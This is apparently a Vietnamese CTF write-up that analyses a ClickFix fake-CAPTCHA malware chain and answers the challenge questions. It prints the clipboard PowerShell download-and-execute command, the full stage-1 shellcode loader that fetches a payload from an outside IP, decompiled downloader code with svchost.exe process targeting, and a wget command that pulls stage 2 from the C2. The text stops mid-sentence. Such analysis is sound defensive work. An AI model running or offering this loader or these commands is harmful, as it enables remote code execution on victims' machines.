# Mr Robot

<img width="869" height="892" alt="image" src="https://github.com/user-attachments/assets/c790f63d-828c-40bf-8b74-765de85db65e" />

Challenge này mình sẽ chỉ có duy nhất 1 artifact là 1 cái url: **https://rededucation.aduma.online**.

Ở challenge này mình sẽ phân tích từng manh mối mà có được bên trong url kia, rồi sẽ thực hiện trả lời các câu hỏi được netcat đến ip:port - 161.33.2.236:31337. Đầu tiên khi mình search url kia thì nó sẽ hiện ra cho mình 1 ô recapcha:

<img width="932" height="440" alt="image" src="https://github.com/user-attachments/assets/899dc022-dc8d-4720-b9b9-19a5b1348d46" />

Thì kỹ thuật này mình có từng đọc trên một blog ở Facebook rồi thấy khá quen quen, thì khi victim thực hiện bắt đầu xác minh là con người, và hiện ra ô như trên, thì 1 command đã được dán sẳn vào phần clipboard rồi, và chỉ cần thực hiện theo attacker thì sẽ máy tính sẽ bắt đầu tải về payload, hoặc something else,...

Như mình đoán thì clipboard của mình sẽ có 1 lệnh powershell sau: `powershell -c iex(irm 152.42.186.220 -UseBasicParsing)`. Giờ mình sẽ check thử `http://152.42.186.220` để xem source là gì:

<img width="1999" height="1198" alt="image" src="https://github.com/user-attachments/assets/ff1fee85-4862-426f-819a-7bfc6b6e6d70" />

```
$u = "http://152.42.186.220/9cca20c6df659f72/m_cpt1267382.bin"



try {

    Write-Host "Loading..." 

    

    $d = Invoke-WebRequest -Uri $u -UseBasicParsing -ErrorAction Stop

    $b = $d.Content

    $s = $b.Length



    $c = @"

using System;

using System.Runtime.InteropServices;

public class W {

    [DllImport("kernel32.dll", SetLastError=true)]

    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError=true)]

    public static extern IntPtr VirtualAlloc(IntPtr a, uint sz, uint t, uint p);

    [DllImport("kernel32.dll", SetLastError=true)]

    public static extern IntPtr CreateThread(IntPtr ta, uint ss, IntPtr sa, IntPtr p, uint cf, out uint tid);

    [DllImport("kernel32.dll", SetLastError=true)]

    public static extern uint WaitForSingleObject(IntPtr h, uint ms);

}

"@



    Add-Type -TypeDefinition $c



    $m1 = 0x1000

    $m2 = 0x2000

    $p = 0x40

    

    $addr = [W]::VirtualAlloc([IntPtr]::Zero, $s, $m1 -bor $m2, $p)

    

    if ($addr -eq [IntPtr]::Zero) {

        throw "Alloc failed"

    }



    [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $addr, $s)

    

    $tid = 0

    $th = [W]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)

    

    if ($th -eq [IntPtr]::Zero) {

        throw "Thread failed"

    }



    [W]::WaitForSingleObject($th, 30000) | Out-Null

    Write-Host "done."

    

} catch {

    Write-Error $_.Exception.Message

    exit 1

}

Beta
0 / 0
used queries
1
```

Ở đây mình sẽ có được source của stage 1 thực hiện tải về 1 file `m_cpt1267382.bin` về máy của victim khi họ dán command powershell kia vào thanh run của `Win R`, toàn bộ source này thực hiện chức năng chính là tải về file payload ở stage 1 kia.

Có được lệnh powershell thực hiện tải về payload đầu thì mình cũng trả lời được câu hỏi đầu tiên của challenge:

```
Q1: What command did the compromised website tell you to run?
     (Example: ping google.com -t)
> powershell -c iex(irm 152.42.186.220 -UseBasicParsing)
```

Tiếp theo mình cần biết website load payload này là từ đâu, mình nghĩ nó cũng sẽ nằm bên trong trang web mà đề cho nên mình thử view source bằng `F12`:

<img width="1976" height="1476" alt="image" src="https://github.com/user-attachments/assets/3b8b4178-ab4a-431f-80f0-6a027d0b6e8c" />

Ở đây mình sẽ thấy bên trong thẻ `<script>` có 1 chuỗi base64 `aHR0cHM6Ly9qc3JlcG8uYWR1bWEub25saW5lL25ldy5qcz8=`, mình thực hiện decode thử thì có được 1 link url khác -> `https://jsrepo.aduma.online/new.js`

Tới đây khi mình truy cập vào thì mình thấy source của web này đã hoàn toàn bị obfuscated, tới đây mình có dùng tools deobfuscated của `https://obf-io.deobfuscate.io/`, nhưng mạng lag quá mình không load được script deobfus, nên mình nhờ AI deobfus hộ:

```
```

Tới đây mình sẽ biết được trang web thực hiện load malicious payload là: https://jsrepo.aduma.online/new.js, nên mình trả lời được câu hỏi thứ 2:

```
Q2: Where does the website load malicious payload from?
     (Example: 8.8.8.8, https://google.com)
> https://jsrepo.aduma.online/new.js
```

Kỹ thuật ở đây được sử dụng là kỹ thuật **filefix - clickfix** dựa vào victim tự load payload vào hệ thống mà attacker không thực hiện trực tiếp.

Bây giờ mình sẽ tải về file `m_cpt1267382.bin`, mình sử dụng tools detect it easy để xem file này được compiler bằng ngôn ngữ gì:

<img width="1264" height="930" alt="image" src="https://github.com/user-attachments/assets/8d002212-a820-4f42-8909-1a901237e64d" />

File được compiler bằng donut shellcode, tới đây mình search trên mạng về donut shellcode là gì?

> Shellcode donut là một bộ mã không phụ thuộc vào vị trí của nó trong bộ nhớ, nó cho phép thực thi các file VBscript, Javascript, thực hiện load các file `.exe`, tự động embeded `.DLL` vào hệ thống. Một module do Donut tạo có thể được staged bởi 1 server C2 hoặc từ chính chương trình được load bên trong nó. Điểm đặc biệt là module này encrypt bằng cách sử dụng block cipher **Chaskey** và khóa được tạo ngẫu nhiên 128-bit, và sau khi file shellcode được load vào bộ nhớ nó sẽ có khả năng tự xóa đi các refernce gốc để tránh bị hệ thống scan.
>

Đây là một dạng shellcode byte và mình cần có một tools để decryptor ở [đây](https://github.com/volexity/donut-decryptor)

<img width="3793" height="1867" alt="image" src="https://github.com/user-attachments/assets/a43a946d-f497-4a58-9f12-ee6fc8962a31" />

Thực hiện `git clone` nó về và tải toàn bộ repo bằng lệnh `python3 -m pip install .`

Sau khi tải xong thì mình dùng lệnh sau để thực hiện decryptor toàn bộ file shellcode:

```
donut-decryptor m_cpt_bld172638.bin
```
<img width="1501" height="328" alt="image" src="https://github.com/user-attachments/assets/90975b5c-dd23-40c1-bab9-6509fcfaff3d" />

Sau đó mở ida lên để phân tích file module_pe.exe mà tools vừa parse ra, thông thường thì khi mình sài ida để phân tích thì mình sẽ bắt đầu view strings để bắt đầu tìm các chuỗi liên quan đến host ip hoặc gì đó:

<img width="1919" height="1017" alt="image" src="https://github.com/user-attachments/assets/113e1841-4307-4d72-bec7-7171286c1cb9" />

Tới đây mình bắt đầu nhấp vào từng chuỗi để xem mã giả của từng hàm để xem logic của hàm là gì:

<details>
    <summary> sub_140001582() 
        // positive sp value has been detected, the output may be wrong!
__int64 sub_140001582()
{
  __int64 v0; // rdx
  __int64 v1; // rbx
  void *v2; // rax
  void *v3; // rbp
  void *v4; // rax
  void *v5; // r13
  __int64 result; // rax
  void *v7; // rax
  void *v8; // r12
  void (__stdcall *v9)(HINTERNET); // rbx
  unsigned int v10; // r15d
  unsigned int v11; // r14d
  void *v12; // rax
  int i; // eax
  unsigned int v14; // eax
  void *v15; // rax
  unsigned int v16; // [rsp+6Ch] [rbp-204Ch] BYREF
  _BYTE v17[8232]; // [rsp+70h] [rbp-2048h] BYREF

  sub_140002C80();
  v1 = v0;
  v2 = WinHttpOpen("m", 0, 0, 0, 0);
  v3 = v2;
  if ( !v2 )
    return 0;
  WinHttpSetTimeouts(v2, 30000, 30000, 30000, 30000);
  v4 = WinHttpConnect(v3, L"152.42.203.28", 0x50u, 0);
  v5 = v4;
  if ( !v4 )
  {
    WinHttpCloseHandle(v3);
    return 0;
  }
  v7 = WinHttpOpenRequest(v4, L"GET", L"/9cca20c6df659f72/m_cpt_bld172638.bin", 0, 0, 0, 0);
  v8 = v7;
  if ( !v7 )
  {
    v9 = (void (__stdcall *)(HINTERNET))WinHttpCloseHandle;
    WinHttpCloseHandle(v5);
LABEL_19:
    v9(v3);
    return 0;
  }
  if ( !WinHttpSendRequest(v7, 0, 0, 0, 0, 0, 0)
    || !WinHttpReceiveResponse(v8, 0)
    || (v10 = 0, v11 = 0x2000, v16 = 0, v12 = malloc(0x2000u), (*(_QWORD *)v1 = v12) == 0) )
  {
LABEL_18:
    v9 = (void (__stdcall *)(HINTERNET))WinHttpCloseHandle;
    WinHttpCloseHandle(v8);
    WinHttpCloseHandle(v5);
    goto LABEL_19;
  }
  for ( i = ((__int64 (__fastcall *)(void *, _BYTE *, __int64, unsigned int *))WinHttpReadData)(v8, v17, 0x2000, &v16);
        i && v16;
        i = ((__int64 (__fastcall *)(void *, _BYTE *, __int64, unsigned int *))WinHttpReadData)(v8, v17, 0x2000, &v16) )
  {
    v14 = v10 + v16;
    if ( v11 < v10 + v16 )
    {
      v11 = v14 + 0x2000;
      v15 = realloc(*(void **)v1, v14 + 0x2000);
      if ( !v15 )
      {
        free(*(void **)v1);
        *(_QWORD *)v1 = 0;
        goto LABEL_18;
      }
      *(_QWORD *)v1 = v15;
    }
    qmemcpy((void *)(*(_QWORD *)v1 + v10), v17, v16);
    v10 += v16;
  }
  WinHttpCloseHandle(v8);
  WinHttpCloseHandle(v5);
  WinHttpCloseHandle(v3);
  *(_DWORD *)(v1 + 8) = v10;
  result = 1;
  if ( !v10 )
  {
    free(*(void **)v1);
    *(_QWORD *)v1 = 0;
    return 0;
  }
  return result;
}
    </summary>
</details>

> Tóm tắt toàn bộ hàm thực hiện kết nối đến server C2: **152.42.203.28** và thực hiện tải về file payload stage 2: **m_cpt_bld172638.bin**. Hơn nữa chúng ta biết được attacker đã thiết kế thêm 1 giá trị `v4` nhận user agent được viết theo chuỗi strings Little Endian: `misssav`, và khi thực hiện tải payload từ C2 về máy nạn nhân thì malware sẽ tự thực hiện thêm user agent phía trước, và phía sau là phần url đến file tải về từ C2 server.
>
> 

<img width="909" height="153" alt="image" src="https://github.com/user-attachments/assets/46d34477-2da9-43db-a839-a39b80fca323" />

Ở đây mình sẽ giải quyết tiếp được câu hỏi tiếp theo trong context của challenge:

```
Q3: Name of the binary file that powershell loaded?
     (Example: cmd.exe)
> m_cpt1267382.bin

```
Khi mình bắt đầu tìm các chuỗi được sử dụng trong file malware của stage 1 thì mình cũng thấy được có 1 tiến trình được gọi đến là `svchost.exe`, giờ mình sẽ phân tích qua về hàm gọi tiến trình `svchost.exe`:

<details>
    <summary> sub_140001885()
        __int64 sub_140001885()
{
  HANDLE Toolhelp32Snapshot; // rax
  void *v1; // rbx
  BOOL i; // eax
  HANDLE v4; // rsi
  BOOL Wow64Process; // [rsp+24h] [rbp-264h] BYREF
  tagPROCESSENTRY32W pe; // [rsp+28h] [rbp-260h] BYREF

  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  v1 = Toolhelp32Snapshot;
  if ( Toolhelp32Snapshot == (HANDLE)-1LL )
    return 0;
  pe.dwSize = 568;
  for ( i = Process32FirstW(Toolhelp32Snapshot, &pe); ; i = Process32NextW(v1, &pe) )
  {
    if ( !i )
    {
      CloseHandle(v1);
      return 0;
    }
    if ( !wcsicmp(pe.szExeFile, L"svchost.exe") )
    {
      v4 = OpenProcess(0x1000u, 0, pe.th32ProcessID);
      if ( v4 )
        break;
    }
LABEL_12:
    ;
  }
  Wow64Process = 0;
  if ( !IsWow64Process(v4, &Wow64Process) || Wow64Process )
  {
    CloseHandle(v4);
    goto LABEL_12;
  }
  CloseHandle(v4);
  CloseHandle(v1);
  return pe.th32ProcessID;
}
    </summary>
</details>

Bên trong mình sẽ thấy hàm `sub_140001885()` nó có set 1 đối tượng là: `tagPROCESSENTRY32W pe` thì `pe` sẽ nhận giá trị tiến trình mà payload sẽ load vào để thực hiện gọi đến tiến trình `svchost.exe`, thì mình cũng thắc mắc tại sao lại cần làm như thế thay vì tự nó chạy 1 process riêng biệt trong hệ thống, mình có googling về **Injector Process**, thì hiểu được:

> Khi chính malware tự thực hiện tạo 1 process từ việc nhận memory từ CPU, thì khi đó nếu victim thấy có gì khác thường và check task manager sẽ thấy cái tiến trình độc hại -> Qua đó cần inject vào 1 process trông liêm trong hệ thống, thì `svchost.exe` gần như là tiến trình luôn chạy trong hệ thống và đặc biệt không bị firewall quét qua.
>
> Attacker dựa vào đó thực hiện inject shellcode donut stage1 vào 1 phần memory của process `svchost.exe` và thực hiện 2 hành vi: tải về payload stage2 và thực hiện decryptor shellcode donut của stage2.

Nên mình cũng sẽ trả lời tiếp được câu hỏi thứ 4:

```
Q4: What process does this binary inject into?
     (Example: notepad.exe)
> svchost.exe
```

Tiếp theo mình tải về payload stage2 bằng lệnh `wget -U missav http://152.42.203.28/9cca20c6df659f72/m_cpt_bld1726`, rồi tiếp tục detect bằng detect it easy thì file này cũng được encrypt bằng shellcode donut:

<img width="902" height="664" alt="image" src="https://github.com/user-attachments/assets/02088760-ff21-4202-97d0-016b60c57913" />

Mình vẫn sẽ tiếp tục dùng tools `donut-decryptor 





